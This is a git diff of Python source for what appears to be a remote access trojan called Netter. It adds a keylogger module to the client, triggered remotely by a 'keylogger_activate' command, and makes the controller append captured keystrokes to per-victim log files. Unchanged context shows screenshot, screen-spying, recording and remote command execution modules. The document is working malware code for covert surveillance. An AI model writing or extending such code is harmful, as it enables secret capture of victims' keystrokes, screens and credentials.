@@ -1,5 +1,5 @@
-import threading, socket, subprocess, typing
-import concurrent.futures, time, pickle, os
+import threading, socket, typing
+import time, pickle, os, json
 from loguru import logger
 
 import zlib
@@ -10,6 +10,7 @@ if typing.TYPE_CHECKING:
     from .sock import NetterServer
 
 from .modules import screenshot as modules_screenshot
+from .modules import keylogger
 from .modules import command_exec
 from .modules import screen_spy
 
@@ -24,10 +25,11 @@ class ClientWrapper:
 
         packetSize: bytes = len(data).to_bytes(4, 'big')
         self.connection.send(packetSize)
+
         byte_sended: int = 0
 
         while byte_sended < len(data):
-            sent = self.connection.send(data[byte_sended:byte_sended + 5120])
+            sent = self.connection.send(data[byte_sended:byte_sended + 512])
 
             if (sent == 0):
                 raise RuntimeError('Socket connection broken')
@@ -42,7 +44,7 @@ class ClientWrapper:
         data, total_received = bytearray(), 0
 
         while total_received < packetSize:
-            chunk = self.connection.recv(min(5120, packetSize - total_received))
+            chunk = self.connection.recv(min(512, packetSize - total_received))
 
             if not chunk:
                 raise RuntimeError('Socket connection broken')
@@ -98,14 +100,13 @@ class ServerHandler:
 
             if (message.startswith(b'keylogger_activate')):
                 if not (self.isRunningKeylogger):
-                    threading.Thread(target = command_exec.run, args = (self, message)).start()
-                    self.socketInstance.send_packet('0')
+                    threading.Thread(target = keylogger.run, args = (self,)).start()
                     self.isRunningKeylogger = True
-                    continue
+                    self.socketInstance.send_packet('_keylogger_response 0')
 
                 else:
                     self.isRunningKeylogger = False
-                    self.socketInstance.send_packet('1')
+                    self.socketInstance.send_packet('_keylogger_response 1')
 
             if (message.startswith(b'start_recording')):
                 if not (self.isRecording):
@@ -134,17 +135,37 @@ class ClientHandler(threading.Thread):
         self.connectionBucket.connectionList.remove(self.conneciton)
         self.isConnected = False
 
-    def write_file(self, file_path: str, content: str | bytes) -> None:
+    def write_file(self, file_path: str, content: str | bytes, mode: str | None = None) -> None:
         directory = os.path.dirname(file_path)
 
         if not os.path.exists(directory):
             os.makedirs(directory)
 
-        with open(file = file_path, mode = ('w' if isinstance(content, str) else 'wb')) as file:
+        with open(file = file_path, mode = (mode if mode else ('w' if isinstance(content, str) else 'wb'))) as file:
             file.write(content)
             file.close()
 
+    def set_cache(self) -> None:
+        result = {}
+
+        for key, value in self.conneciton.__dict__.items():
+            if key == 'socket':
+                break
+
+            result[key] = value
+
+        self.write_file(f'clients/cache/{self.conneciton.clientUniqueID}.json', '{}')
+        print(result)
+
+        json.dump(result,
+            open(f'clients/cache/{self.conneciton.clientUniqueID}.json', 'w'),
+            indent = 2
+        )
+
     def run(self) -> None:
+        if (self.conneciton.runningKeylogger):
+            self.conneciton.socket.send_packet('keylogger_activate')
+
         while self.isConnected:
             if (self.conneciton.stillRecording): continue
 
@@ -160,6 +181,8 @@ class ClientHandler(threading.Thread):
             if (data.startswith(b'submit_additional_data ')):
                 clientAdditionalData: dict = pickle.loads(data[23:])
                 self.conneciton.additionalData = clientAdditionalData
+
+                self.conneciton.socket.receive_packet() # Used to verbose the _keylogger response
 
             if (data.startswith(b'exec_response ')):
 
@@ -183,7 +206,7 @@ class ClientHandler(threading.Thread):
                     self.NetterInstance._waitingForResponse = False
                     continue
 
-                fileName: str = f'clients/responses/{self.conneciton.clientUniqueID}/{self.conneciton.hostname}-{str(time.time())}.png'
+                fileName: str = f'clients/responses/{self.conneciton.clientUniqueID}/screenshot/{self.conneciton.hostname}-{str(time.time())}.png'
                 screenImg: bytes = zlib.decompress(data[20:])
 
                 self.write_file(fileName, screenImg)
@@ -191,4 +214,21 @@ class ClientHandler(threading.Thread):
                 self.NetterInstance._waitingForResponse = False
 
             if (data.startswith(b'keylogger_response ')):
-                ...
+                self.write_file(
+                    f'clients/responses/{self.conneciton.clientUniqueID}/keylogger.log',
+                    data[19:].decode('UTF-8') + '\n',
+                    mode = 'a'
+                )
+
+            if (data.startswith(b'_keylogger_response ')):
+                if (data.decode('UTF-8')[-1] == '0'):
+                    logger.success('Keylogger has been activated, log will be saved on clients/responses/keylogger.log')
+                    self.conneciton.runningKeylogger = True
+
+                else:
+                    logger.success('Keylogger sucessfully turned off')
+                    self.conneciton.runningKeylogger = False
+
+                self.set_cache()
+                self.NetterInstance._waitingForResponse = False
+                continue
